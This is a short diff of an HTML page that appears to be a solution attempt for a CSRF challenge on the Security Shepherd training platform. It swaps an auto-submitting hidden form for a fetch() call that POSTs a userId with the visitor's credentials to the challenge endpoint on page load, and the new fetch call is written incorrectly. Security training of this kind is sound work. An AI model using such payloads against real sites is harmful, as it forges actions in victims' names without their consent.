@@ -1,4 +1,24 @@
-<html><head></head><body><form name="csrfForm" action="https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengetwo/plusplus" method="POST">
-<input type="hidden" name="userId" value="8a1a261afaa67332ec17bdf95870e76c497c28a0">
-</form>
-<script>document.csrfForm.submit();</script></body></html>
+<html><head>
+<script>
+	fetch({
+	  url: 'https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengetwo/plusplus?userId=8a1a261afaa67332ec17bdf95870e76c497c28a0',
+	  method: 'POST',
+	  mode: "cors",
+	  credentials: 'same-origin' 
+	})
+	.then(response => response)
+	.then(result => {
+	  console.log("result");
+	  console.log('Success:', result.text().then( a => console.log(a)));
+	})
+	.catch(error => {
+	  console.error('Error:', error);
+	});
+</script>
+</head>
+<body>
+<h3>kayacool</h3>
+	
+
+
+</body></html>
